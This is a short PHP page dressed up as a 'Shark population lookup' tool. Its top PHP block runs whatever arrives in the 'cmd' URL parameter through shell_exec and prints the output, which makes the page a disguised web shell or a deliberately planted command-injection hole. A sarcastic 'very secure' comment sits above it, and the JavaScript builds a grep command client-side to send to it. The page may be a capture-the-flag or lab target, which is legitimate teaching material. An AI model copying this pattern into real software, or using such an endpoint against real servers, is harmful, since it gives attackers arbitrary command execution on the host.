<?php
$raw    = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$output = '';

if ($raw !== '') {
// very secure code below
$output = shell_exec($raw . ' 2>&1');
if ($output === null) { $output = ''; }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shark population lookup</title>
<link rel="stylesheet" href="/style.css">
<style>
.tool{max-width:640px;margin:1.5rem auto;padding:0 1.5rem;}
.box{background:#fff;border:1px solid #9aa7b0;padding:1.2rem}
input[type=text]{width:100%;padding:.45rem .6rem;border:1px solid #7f8c94;
font-size:13px;margin:.3rem 0 .8rem}
.result{margin-top:1.2rem;padding:.8rem 1rem;border:1px solid #b7cbdb;
background:var(--foam);color:var(--ink)}
pre{margin:0;white-space:pre-wrap;word-break:break-word;font-size:12px}
.back{display:inline-block;margin-top:1.2rem;font-size:12px}
</style>
</head>
<body>
<div class="tool">
<div class="box">
<h1 style="margin-top:0">How many are left?</h1>
<p>Type a species (try <code>zebra</code>, <code>whale</code>, <code>mako</code>...)
         and we'll look up our rough estimate.</p>

<input type="text" id="species" placeholder="e.g. zebra" autofocus>
<button class="btn" onclick="lookup()">Look up</button>

<?php if ($raw !== ''): ?>
<div class="result">
<pre><?= htmlspecialchars($output) ?></pre>
</div>
<?php endif; ?>

<a class="back" href="/">&larr; Back</a>
</div>
</div>

<script>
function lookup() {
var s = document.getElementById('species').value.trim().toLowerCase();
if (!s) return;
// Build the lookup command and send it as ?cmd=...
      window.location = '/population.php?cmd=' + encodeURIComponent('grep ' + s + ' sharks.txt');
}
    document.getElementById('species').addEventListener('keydown', function(e){
if (e.key === 'Enter') lookup();
});
</script>
</body>
</html>
